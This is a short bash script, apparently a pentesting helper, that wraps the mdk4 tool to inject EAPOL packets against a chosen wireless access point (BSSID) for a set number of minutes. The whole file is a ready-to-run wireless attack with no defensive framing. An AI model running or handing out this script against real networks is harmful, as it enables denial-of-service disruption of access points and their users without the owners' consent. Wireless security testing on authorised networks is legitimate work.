#!/bin/bash


if [ "$#" -lt 3 ]
then
    echo "[*] Usages: ./eapolPacketInjection.sh {Interface_name} {BSSID} {Miniutes}"
    exit 1
fi

if [ "$#" -eq 3 ]
then
    
    timeout $3m mdk4 $1 e -t $2 -l

fi